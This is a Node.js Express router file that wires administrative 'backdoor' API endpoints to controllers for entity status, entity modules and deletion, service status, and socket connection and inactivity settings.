const express = require('express');
const backdoorStatusController = require('../modules/backdoor/status/status.controller');
const backdoorSocketsController = require('../modules/backdoor/sockets/sockets.controller');
const backdoorEntitiesController = require('../modules/backdoor/entities/entities.controller');

const router = express.Router();

/* API ENDPOINTS */

/* ----------- BACKDOOR ----------- */
/* ENTITIES */
router.get('/entities/status/:entityId/:status', backdoorEntitiesController.setStatus);
router.get('/entities/modules/:entityId/:module/:status', backdoorEntitiesController.handleModule);
router.get('/entities/delete/:entityId', backdoorEntitiesController.removeEntity);

/* STATUS */
router.get('/status', backdoorStatusController.getStatus);

/* SOCKETS */
router.get('/sockets/validation/connections/:value', backdoorSocketsController.setMaxConnections);
router.get('/sockets/validation/inactivity/:value', backdoorSocketsController.setSocketInactivityTime);
router.get('/sockets/validation/agents/:value', backdoorSocketsController.setConnectionWithoutAgentsValidation);

module.exports = router;
